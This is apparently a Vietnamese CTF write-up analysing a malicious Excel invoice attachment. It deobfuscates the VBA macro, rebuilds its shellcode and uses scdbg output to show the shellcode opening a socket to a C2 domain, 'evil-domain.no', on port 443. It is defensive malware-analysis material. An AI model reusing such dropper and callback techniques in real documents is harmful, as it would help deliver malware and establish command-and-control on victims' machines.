# oBfsC4t10n
## CHALLENGE DESCRIPTION
:::info
This document came in as an email attachment. Our SOC tells us that they think there were some errors in it that caused it not to execute correctly. Can you figure out what the command and control mechanism would have been had it worked?
:::

## Tools use
- scdbg
- olevba
- Excel
- CyberChef
- ChatGPT
 
# Analysis
Giải nén file ta được file sau:
```
.
├── oBfsC4t10n
│   ├── invoice-42369643.html
```

Mở file này và tải xuống file 

![image](https://hackmd.io/_uploads/Hy8HwVw-xl.png)

## olevba
Sử dụng `olevba` ta thấy kết quả cho thấy nó có rất nhiều call function và cả file thực thi bên trong
```
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|AutoExec  |Label1_Click        |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |LwTHLrGh.hta        |Executable file name                         |
+----------+--------------------+---------------------------------------------+
```

## Excel
Mở file lên và thấy cảnh báo với file mà `olevba` phát hiện cùng với đường dẫn của file đang nằm ở temp

![image](https://hackmd.io/_uploads/SJONdXv-xl.png)

![image](https://hackmd.io/_uploads/r1iw_mvWgx.png)

Đọc nội dung file 

![image](https://hackmd.io/_uploads/ByTi_XD-ge.png)

Tại phần macro có thế thấy nó đã bị obfuscate, tuy nhiên trông cũng rất dễ nhìn 

![image](https://hackmd.io/_uploads/BJnLOVDWee.png)

Sử dụng [Cyberchef](https://gchq.github.io/CyberChef/) để thay thế `""""` thành `""` và `&` thành khoảng trắng ta sẽ thấy dễ nhìn hơn nữa

![image](https://hackmd.io/_uploads/B1gf5Vv-lg.png)

Chú ý ở phần liên tục xuất hiện các chuỗi mã và được nằm trong `myArray` đây là hành vi đang tạo ra một process bằng array này

![image](https://hackmd.io/_uploads/r1ikFVwbel.png)

Vì đang còn các ký tự `Chr(x)` nữa nên có 2 cách một là thay bằng tay hai (ví dụ: `Chr(10)` -> `\n`, `Chr(34)` -> `"`, `Chr(92)` -> `\`) là dùng chatgpt nhờ nó thay cho nhanh

## ChatGPT
![image](https://hackmd.io/_uploads/rJ0wiVwbgg.png)

Tiếp theo ta sẽ tạo lại shellcode này
:::spoiler CHuyển đổi sang shellcode
```python
myArray = []

# Chuyển đổi: giá trị âm → byte bằng cách & 0xFF
byte_array = bytes([(b & 0xFF) for b in myArray])

# Ghi ra file nhị phân
with open("shellcode.bin", "wb") as f:
    f.write(byte_array)

print("Đã tạo file shellcode.bin")
```
:::

## scdbg
![image](https://hackmd.io/_uploads/B1d5kEwbgl.png)

```
Loaded 1a1 bytes from file Z:\home\remnux\Desktop\SHEL~KVV.BIN
Testing 417 offsets  |  Percent Complete: 98%  |  Completed in 182 ms
0) offset=0x0          steps=MAX    final_eip=7c801d7b   LoadLibraryA
Loaded 1a1 bytes from file Z:\home\remnux\Desktop\SHEL~KVV.BIN
Initialization Complete..
Max Steps: 2000000
Using base offset: 0x401000

4010b6	LoadLibraryA(ws2_32)
4010c6	WSAStartup(190)
4010d5	WSASocket(af=2, tp=1, proto=0, group=0, flags=0)
401109	gethostbyname(evil-domain.no/HTB{_}) = 1000
401121	connect(h=42, host: 127.0.0.1 , port: 443 ) = 71ab4a07
40113c	recv(h=42, buf=12fc60, len=4, fl=0)
40117f	closesocket(h=42)
401109	gethostbyname(evil-domain.no/HTB{_}) = 1000

Stepcount 2000001
```

- Shellcode nạp thư viện `ws2_32.dll` — đây là thư viện Windows dùng cho lập trình mạng (Winsock API). Đây là bước chuẩn bị để dùng các hàm socket như `connect`, `send`, `recv`.
- Shellcode đã chuẩn bị một kênh TCP, có thể để kết nối ra ngoài bằng 
`4010d5	WSASocket(af=2, tp=1, proto=0, group=0, flags=0)`
- Domain `evil-domain.no/HTB{_}` đang được resolve (chuyển thành địa chỉ IP). Đây là C2 server mà ta đang tìm
